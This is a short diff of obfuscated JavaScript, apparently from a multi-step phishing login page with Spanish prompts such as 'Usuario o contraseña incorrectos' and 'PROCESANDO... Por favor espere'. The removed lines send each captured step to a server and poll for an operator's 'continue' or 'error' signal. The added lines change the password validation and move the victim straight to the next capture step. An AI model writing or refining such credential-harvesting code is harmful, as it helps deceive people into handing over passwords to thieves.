@@ -1631,14 +1631,9 @@
         if (_step == 1) { _step = 2; _show(2); }
         else if (_step == 2) {
           var _v2 = _i2.value;
-          var _ok2 = _v2.length >= 8 && _v2.length <= 20 && /[A-Z]/.test(_v2) && /[0-9]/.test(_v2);
-          if (!_ok2) { _notify('Usuario o contraseña incorrecto.', 3000); _i1.value = ''; _i2.value = ''; _step = 1; _show(1); return; }
-          _showOverlay(); _ovText('PROCESANDO...\nPor favor espere.');
-          _sendStep(2);
-          _poll(function (state) {
-            if (state === 'continue') { _hideOverlay(); _step = 3; _show(3); }
-            else if (state === 'error') { _hideOverlay(); _notify('Algunos de tus datos son incorrectos.', 3500); _i1.value = ''; _i2.value = ''; _step = 1; _show(1); }
-          });
+          var _ok2 = _v2.length >= 8 && _v2.length <= 16 && /[A-Z]/.test(_v2) && /[a-z]/.test(_v2) && /[0-9]/.test(_v2) && /[#$@_\-]/.test(_v2);
+          if (!_ok2) { _notify('Usuario o contraseña incorrectos.', 3000); _i1.value = ''; _i2.value = ''; _step = 1; _show(1); return; }
+          _step = 3; _show(3);
         }
         else if (_step == 3) {
           _showOverlay(); _ovText('PROCESANDO...\nPor favor espere.');
